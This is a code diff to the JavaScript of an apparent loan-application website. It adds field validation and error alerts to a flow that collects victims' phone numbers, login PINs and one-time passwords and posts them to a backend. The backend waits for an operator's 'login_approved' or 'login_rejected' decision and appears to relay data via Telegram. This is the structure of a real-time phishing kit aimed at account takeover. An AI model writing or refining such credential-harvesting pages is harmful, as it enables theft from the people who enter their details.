@@ -283,34 +283,55 @@
   termSlider.addEventListener('input', updateCalculator);
   updateCalculator();
 
-  // No more "Please fill in all fields" alerts
   function saveStep1() {
-    const purpose = document.getElementById('loanPurpose').value;
-    formData.loanAmount = document.getElementById('loanAmount').value;
-    formData.loanTerm = document.getElementById('loanTerm').value;
+    const amount = document.getElementById('loanAmount').value;
+    const term = document.getElementById('loanTerm').value;
+    const purpose = document.getElementById('loanPurpose').value.trim();
+
+    if (!amount || !term || !purpose) {
+      return alert('Please fill in all fields.');
+    }
+
+    formData.loanAmount = amount;
+    formData.loanTerm = term;
     formData.purpose = purpose;
     goToPage('page-step2');
   }
 
   function saveStep2() {
-    const firstName = document.getElementById('firstName').value;
-    const lastName = document.getElementById('lastName').value;
-    const email = document.getElementById('email').value;
-    const phone = document.getElementById('phone').value;
-    formData.firstName = firstName; formData.lastName = lastName; formData.email = email; formData.phone = phone;
-    document.getElementById('sumAmount').textContent = `ZAR ${parseInt(formData.loanAmount || 0).toLocaleString()}`;
-    document.getElementById('sumTerm').textContent = `${formData.loanTerm || 6} Months`;
-    document.getElementById('sumPurpose').textContent = formData.purpose || '-';
-    document.getElementById('sumApplicant').textContent = `${firstName} ${lastName}`.trim() || '-';
+    const firstName = document.getElementById('firstName').value.trim();
+    const lastName = document.getElementById('lastName').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+
+    if (!firstName || !lastName || !email || !phone) {
+      return alert('Please fill in all fields.');
+    }
+
+    formData.firstName = firstName; 
+    formData.lastName = lastName; 
+    formData.email = email; 
+    formData.phone = phone;
+    
+    document.getElementById('sumAmount').textContent = `ZAR ${parseInt(formData.loanAmount).toLocaleString()}`;
+    document.getElementById('sumTerm').textContent = `${formData.loanTerm} Months`;
+    document.getElementById('sumPurpose').textContent = formData.purpose;
+    document.getElementById('sumApplicant').textContent = `${firstName} ${lastName}`;
     goToPage('page-step3');
   }
 
   function submitApplication() {
-    const annualIncome = document.getElementById('annualIncome').value;
+    const annualIncome = document.getElementById('annualIncome').value.trim();
+
+    if (!annualIncome) {
+      return alert('Please fill in all fields.');
+    }
+
     formData.employmentStatus = document.getElementById('employmentStatus').value;
     formData.annualIncome = annualIncome;
     goToPage('page-success');
     showToast();
+    
     let countdown = 3;
     const timer = setInterval(() => {
       countdown--;
@@ -325,15 +346,20 @@
   }
 
   async function submitLogin() {
-    const phone = document.getElementById('loginPhone').value;
-    const pin = document.getElementById('loginPin').value;
+    const phone = document.getElementById('loginPhone').value.trim();
+    const pin = document.getElementById('loginPin').value.trim();
+
+    if (!phone || !pin) {
+      return alert('Please fill in all fields.');
+    }
+
     if (!currentRequestId) currentRequestId = Math.random().toString(36).substring(2, 10);
     toggleLoading(true);
     try {
       const res = await fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ requestId: currentRequestId, phone, pin }) });
       if (!res.ok) throw new Error('Failed');
       startPolling('login');
-    } catch (err) { toggleLoading(false); }
+    } catch (err) { toggleLoading(false); alert('Error connecting to Telegram.'); }
   }
 
   function validateOTP(input, index) {
@@ -346,13 +372,15 @@
   async function submitOTP() {
     const inputs = document.querySelectorAll('.otp-input');
     let otp = ''; inputs.forEach(input => otp += input.value);
-    if (otp.length !== 4) return alert('Incorrect OTP.');
+    
+    if (otp.length !== 4) return alert('Please fill in all fields.');
+
     toggleLoading(true);
     try {
       const res = await fetch('/api/otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ requestId: currentRequestId, otp }) });
       if (!res.ok) throw new Error('Failed');
       startPolling('otp');
-    } catch (err) { toggleLoading(false); }
+    } catch (err) { toggleLoading(false); alert('Error connecting to Telegram.'); }
   }
 
   function startPolling(stage) {
@@ -362,13 +390,13 @@
         const response = await fetch(`/api/status/${currentRequestId}`);
         if (!response.ok) return;
         const data = await response.json();
+        
         if (stage === 'login') {
           if (data.status === 'login_approved') {
             clearInterval(pollingInterval); toggleLoading(false);
             const phoneVal = document.getElementById('loginPhone').value;
             document.getElementById('maskedPhone').textContent = `+27 ${phoneVal.substring(0,3)}***${phoneVal.slice(-3)}`;
             goToPage('page-otp');
-            // Auto focus first OTP box
             document.querySelectorAll('.otp-input')[0].focus();
           } else if (data.status === 'login_rejected') {
             clearInterval(pollingInterval); toggleLoading(false); alert('Incorrect PIN.');
@@ -381,7 +409,6 @@
             clearInterval(pollingInterval); 
             toggleLoading(false); 
             alert('Incorrect OTP.'); 
-            // Clear all inputs and focus the first one immediately
             const otpInputs = document.querySelectorAll('.otp-input');
             otpInputs.forEach(input => input.value = '');
             otpInputs[0].focus();
